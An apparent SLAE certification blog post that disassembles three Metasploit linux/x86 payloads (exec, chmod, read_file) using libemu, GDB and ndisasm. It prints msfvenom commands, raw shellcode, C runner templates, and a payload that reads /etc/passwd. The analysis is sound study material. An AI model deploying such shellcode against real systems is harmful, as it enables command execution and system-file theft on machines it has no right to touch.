---
layout: post
title: SLAE Assignment 5 - Analyzing Metasploit Payloads
---

Metasploit is an awesome penetration testing software which a large number of exploits, payloads, encoders etc. Our goal in this assignment is to analyze three different payloads for linux/x86 generated with msfpayload (I will be using msfvenom instead) using GDB/Ndisasm/Libemu.

<!-- more -->

![asn-5-linux-x86-payloads](/assets/SLAE-x86/asn-5/asn-5-linux-x86-payloads.PNG)

As we can see, Metasploit provides an exhaustive list of payloads for linux/x86 alone. I have chosen to analyze the following three payloads.
1. EXEC - linux/x86/exec
2. CHMOD - linux/x86/chmod
3. READ_FILE - linux/x86/read_file


### #1. EXEC - linux/x86/exec - [Libemu and GDB]
The first shellcode that we are going to analyze is the `linux/x86/exec`. Instead of msfpayload, we will be using msfvenom - replacement for msfpayload and msfencode - to generate the shellcodes. Lets look at the payload options. The below command can be used to see the available options for a payload.

```
msfvenom -p <payload_name> --payload-options
```
![asn-5-exec-payload-opt](/assets/SLAE-x86/asn-5/asn-5-exec-payload-opt.PNG)

As we can see, the `CMD` option is to be set to the command string to be executed. With that information, let us generate the shellcode to execute the command `id`. The following command is used to generate the shellcode.

```
msfvenom -p linux/x86/exec CMD=id -f c | cut -d '"' -f 2 | tr -d '\n'
```
This will give us the shellcode in a single line without the double quotes.
![asn-5-exec-msfvenom-shellcode](/assets/SLAE-x86/asn-5/asn-5-exec-msfvenom-shellcode.PNG)

Now that we have the actual shellcode, lets analyze it using **libemu**. We will make use of the **sctest** binary which comes with libemu to emulate the shellcode and see which system call is being executed and what parameters are passed to it. I have created an alias variable named 'sctest' which actually points to the original sctest binary stored in a different location. The following command is used for creating the alias.

```
alias sctest=~/Desktop/libemu/libemu-master/tools/sctest/sctest
```
The following command can be used to emulate the shellcode using libemu.
```
echo -ne "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x69\x64\x00\x57\x53\x89\xe1\xcd\x80" | sctest -vvv -Ss 10000
```
The following is the output of the above command.
```
<truncated>
int execve (
     const char * dateiname = 0x00416fc0 => 
           = "/bin/sh";
     const char * argv[] = [
           = 0x00416fb0 => 
               = 0x00416fc0 => 
                   = "/bin/sh";
           = 0x00416fb4 => 
               = 0x00416fc8 => 
                   = "-c";
           = 0x00416fb8 => 
               = 0x0041701d => 
                   = "id";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
```
![asn-5-exec-libemu](/assets/SLAE-x86/asn-5/asn-5-exec-libemu.PNG)

As we can clearly see, the execve() system call is executed. Let us look at the linux man page entry for execve().
```
int execve(const char *filename, char *const argv[], char *const envp[]);
```
The execve() executes the program pointed to by filename. The `argv` is an array of argument strings passed to the new program.  By convention, the first of these strings should contain the filename associated with the file being executed. The  `envp` is an array of strings, conventionally of the form key=value, which are passed as environment to the new program.  Both `argv` and `envp`  must  be terminated by a NULL pointer.

In the above output of sctest we can see the pointer `dateiname` is pointing to the filename `/bin/sh`. So `/bin/sh` is executed by execve. The `argv` array contains the strings starting with the filename of the file being executed.
```
argv = ['/bin/sh', '-c', 'id', NULL]
```
We are not making any changes to the environment, so `envp` contains NULL.

Now let us verify this using **GDB**. Insert the shellcode in the template c file and compile. 
```c
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x69\x64\x00\x57\x53\x89\xe1\xcd\x80";
main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```
Open the executable in GDB (I am using GDB PEDA) and set a break point at the begnning of execution of our shellcode. This can be done using the command `break *&code`. Lets look at the disassembly of the funtion `code`.

![asn-5-exec-gdb-01-disas](/assets/SLAE-x86/asn-5/asn-5-exec-gdb-01-disas.PNG)

Looking at the disassembly we dont see the int 0x80 which will execute the system call. Let us set a break point at the address of the instruction `call   0x804a060 <code+32>`, ie at `0x0804a058` and continue execution.

![asn-5-exec-gdb-02-call](/assets/SLAE-x86/asn-5/asn-5-exec-gdb-02-call.PNG)

Looking at the stack, we see the strings `"/bin/sh", "-c"` but we still dont see the command `id` which we actually wanted execute. Now the EIP is at the address of the `call   0x804a060 <code+32>` instruction. Once the call is executed, the address of instruction next to it will be pushed on to the stack. Which is `0x804a05d` and the instuction at that address does not make any sense. Lets examine the string at this address.

![asn-5-exec-gdb-02-call-01](/assets/SLAE-x86/asn-5/asn-5-exec-gdb-02-call-01.PNG)

There we have it. The command `id` that we wanted to execute. Now let us step through the execution.

![asn-5-exec-gdb-03-step](/assets/SLAE-x86/asn-5/asn-5-exec-gdb-03-step.PNG)

Now we see the `int 0x80` instruction which will actually call the system call. Lets set a break point at this address `0x0804a064` and continue execution.

![asn-5-exec-gdb-05-execve-call](/assets/SLAE-x86/asn-5/asn-5-exec-gdb-05-execve-call.PNG)

The `int 0x80` instruction at `0x0804a064` invokes the execve system call with the required parameters. The register layout just before the system call is as follows.

EAX = 0xb = execve()

EBX = Pointer to the filename of the file to be executed - "/bin/sh"

ECX = Pointer to argv

EDX = envp = NULL

Once the execve system call is completed, there is no need for another exit system call. This is because execve() does not return on success, and the text, data, bss, and stack of the calling process are overwritten by that of the program loaded.


### #2. CHMOD - linux/x86/chmod - [NDISASM]
The `linux/x86/chmod` runs chmod on specified file with specified mode. The chmod command is used to set permission of files. Let us look at the msfvenom payload options.

![asn-5-chmod-payload-options-00](/assets/SLAE-x86/asn-5/asn-5-chmod-payload-options-00.PNG)

We need to set two options, FILE and MODE while generating the payload. below are the values I chose for these two options.
```
FILE=/tmp/ub3r
MODE=0600
```
Now let us generate the shellcode with the following command.
```
msfvenom -p linux/x86/chmod FILE=/tmp/ub3r MODE=0600 -f c | cut -d '"' -f 2 | tr -d '\n'
```
![asn-5-chmod-payload-gen](/assets/SLAE-x86/asn-5/asn-5-chmod-payload-gen.PNG)

Make sure the shellcode works. Insert the shellcode in the template file.
```
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x99\x6a\x0f\x58\x52\xe8\x0a\x00\x00\x00\x2f\x74\x6d\x70\x2f\x75\x62\x33\x72\x00\x5b\x68\x80\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80";
main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```
Compile and execute (The shellcode length are not correct as there are null bytes in the shellcode).
![asn-5-chmod-execution](/assets/SLAE-x86/asn-5/asn-5-chmod-execution.PNG)

Having generated the shellcode, lets start analyzing the shellcode using **NDISASM**. The following command is used to dump the assembly instructions from the shellcode.
```
echo -ne "\x99\x6a\x0f\x58\x52\xe8\x0a\x00\x00\x00\x2f\x74\x6d\x70\x2f\x75\x62\x33\x72\x00\x5b\x68\x80\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
```
![asn-5-chmod-ndisasm](/assets/SLAE-x86/asn-5/asn-5-chmod-ndisasm.PNG)

We will go through each assembly instruction and try to interpret the meaning.
```
00000000  99                cdq                         ; Clears EDX; EDX = 0x0
```
The CDQ (Convert Doubleword to Quadword) instruction extends the sign bit of EAX into the EDX register.
```
00000001  6A0F              push byte +0xf		; PUSH 0xf onto stack
00000003  58                pop eax			; Clears EAX and POPs the value 0xf into EAX; EAX = 0xf
							; sys_chmod
```
Since `EAX=0xf`, we know which system call is going to be executed. The `SYS_CHMOD` system call. Before we proceed further, lets see which registers will be holding the parameters for the system call.
```

EAX = 0x0f = sys_chmod

EBX = const char __user *filename = Pointer to the filename

ECX = mode_t mode

```
Lets continue analysing the assembly instructions.
```
00000004  52                push edx			; EDX = 0x0 is PUSHed onto stack
00000005  E80A000000        call dword 0x14
```
Once the `call dword 0x14` instruction at `0x00000005` is executed, the five instructions from `0x0000000A` to `00000011` are skipped and seems useless. That does not make any sense, right?. Lets examine these instructions and their shellcode bytes.
```
0000000A  2F                das				; '2F746D702F7562337200'.decode('hex') = '/tmp/ub3r\x00'
0000000B  746D              jz 0x7a
0000000D  702F              jo 0x3e
0000000F  7562              jnz 0x73
00000011  337200            xor esi,[edx+0x0]
```
The shellcode bytes corresponding to these five instrcution is `2F746D702F7562337200` which is hex equivalent of the filename (null terminated) that we want to set permission on - "/tmp/ub3r\x00". We can verify this with the following python one liner.
```python
python -c "print '2F746D702F7562337200'.decode('hex')"
```
So when the `call dword 0x14` instruction is executed, the address of instruction next to it is pushed onto the stack. we already know that this is nothing but the address pointing to the filename. Now let us examine the rest of the shellcode.
```
00000014  5B                pop ebx			; ebx = address pointing to filename = '/tmp/ub3r' null terminated
00000015  6880010000        push dword 0x180		; permission in octal; 0x180 = 0600 octal
0000001A  59                pop ecx			; ecx = 0600
0000001B  CD80              int 0x80			; execute the sys_chmod system call
0000001D  6A01              push byte +0x1
0000001F  58                pop eax			; EAX = 0x1 = exit systemcall
00000020  CD80              int 0x80			; execute exit system call
```
The `int 0x80` at `0000001B` executes the sys_chmod system call. The arguments for the system call are stored in ebx and ecx. The rest of the shellcode from `0x0000001D` to `0x00000020` is to call exit system call.

### #3. READ_FILE - linux/x86/read_file - [NDISASM]
The `linux/x86/read_file` reads up to 4096 bytes from the local file system and write it back out to the specified file descriptor. Lets look at the payload options.

![asn-5-readfile-payload-options](/assets/SLAE-x86/asn-5/asn-5-readfile-payload-options.PNG)

We need to set two options, FD(the file descriptor to write output to) and PATH(the file path to read). We will generate a shellcode to read the file `/etc/passwd` and write it to the `stdout`. Generate the shellcode with the options `FD=1`(stdout) and `PATH=/etc/passwd`.

```
msfvenom -p linux/x86/read_file PATH=/etc/passwd -f c | cut -d '"' -f 2 | tr -d '\n'
```
![asn-5-readfile-payload-gen](/assets/SLAE-x86/asn-5/asn-5-readfile-payload-gen.PNG)

Make sure the shellcode works. Insert the shellcode in the template file.
```
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```
Compile and execute (the shellcode length are not correct as there are null bytes in the shellcode).
![asn-5-readfile-execution](/assets/SLAE-x86/asn-5/asn-5-readfile-execution.PNG)

Dump the assembly instructions from shellcode using **NDISASM**.

```
echo -ne "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u -
```

![asn-5-readfile-ndisasm-dump](/assets/SLAE-x86/asn-5/asn-5-readfile-ndisasm-dump.PNG)

Lets analyze the assembly code line by line. We will analyze the instructions from `0x00000002` to `0x00000036` after we analyze the following snippet.

#### Get address of filename string - JMP-CALL-POP

```
00000000  EB36              jmp short 0x38
	..........................
        <0x00000002 to 0x00000036>
        ..........................
00000038  E8C5FFFFFF        call dword 0x2
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7061              jo 0xa5
00000044  7373              jnc 0xb9
00000046  7764              ja 0xac
00000048  00                db 0x00
```

When the `jmp short 0x38` instruction is executed, the execution control is passed to the instruction at`0x00000038`, ie `call dword 0x2`. When the `call` instruction is executed, the address of instruction next to it(`0x0000003D`) is pushed on to the stack. Let us examine what is there at this address. If we look at the shellcode bytes from `0000003D` to `00000048`, we can see that this is the filename of the file we want to read. Let us decode these bytes using the following python one liner.
```
$ python -c "print '2f6574632f706173737764'.decode('hex')"
/etc/passwd
```
The NULL byte at `0x00000048` acts as null terminator for the filname string. Once the `call dword 0x2` is executed, the top of the stack will contain the address pointing our filename. Now lets examine the rest of the shellcode from `0x00000002` to `0x00000036`.

#### Open file in O_RDONLY - int open(const char *pathname, int flags);
```
00000002  B805000000        mov eax,0x5			; eax = 0x5 ; sys_open
00000007  5B                pop ebx			; ebx = /etc/passwd address ; const char __user *filename
00000008  31C9              xor ecx,ecx			; ecx = 0 ; int flags
0000000A  CD80              int 0x80			; execute sys_open
```
Lets try to understand which system call is being called in the above snippet. For that we will look at the register values.


EAX = 0x5	; sys_open system call

EBX = argument 1 for open; 	The address pointing to the filename(`/etc/passwd`)

ECX = argument 2 for open;	0		; O_RDONLY


So the **sys_open** system call is being called and the arguments for the open system call are stored in EBX and ECX. Once the sys_open system call is successfully executed, EAX will have the file descriptor returned by the system call.

#### Read file contents and store in a buffer - ssize_t read(int fd, void *buf, size_t count);

```
0000000C  89C3              mov ebx,eax			; eax has open fd, copy it to ebx
0000000E  B803000000        mov eax,0x3			; eax = 0x3 ; sys_read
00000013  89E7              mov edi,esp			; save esp in edi
00000015  89F9              mov ecx,edi			; ecx = *buf	; points to the stack
00000017  BA00100000        mov edx,0x1000		; edx = 0x1000 ; 4096 ; count
0000001C  CD80              int 0x80
```
Lets examine the register values.


EAX = 0x3	; sys_read

EBX = argument 1 for read; open file descriptor

ECX = argument 2 for read; address pointing to the top of stack

EDX = argument 3 for read; 0x1000 = 4096


The **sys_read** system call is invoked, the arguments for the system call are stored in EBX, ECX and EDX. The above snippet reads upto 4096 bytes from the open file pointed by file descriptor in EBX and stores in buffer pointed ECX. Once the system call is executed successfully, the file contents will be stored on stack and the number of bytes read is returned to EAX.

#### Write the buffer content to stdout - ssize_t write(int fd, const void *buf, size_t count);
```
0000001E  89C2              mov edx,eax			; edx = size_t count ; number of bytes to write
00000020  B804000000        mov eax,0x4			; eax = 0x4 ; sys_write
00000025  BB01000000        mov ebx,0x1			; ebx = 0x1 ; stdout
0000002A  CD80              int 0x80
```
Lets examine the registers.


EAX = 0X4 ; sys_write system call

EBX = argument 1 for write; 0x1; write to stdout

ECX = argument 2 for write; *buf; address pointing to the top of stack

EDX = argument 2 for write; how many bytes to write


The **sys_write** system call is invoked. Once executed successfully, the file contents in the buffer and written to the stdout.

The rest of the instructions are to exit the program by calling **sys_exit**.
```
0000002C  B801000000        mov eax,0x1			; sys_exit
00000031  BB00000000        mov ebx,0x0			; return code
00000036  CD80              int 0x80
```


And we are done :)


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: **SLAE-933**
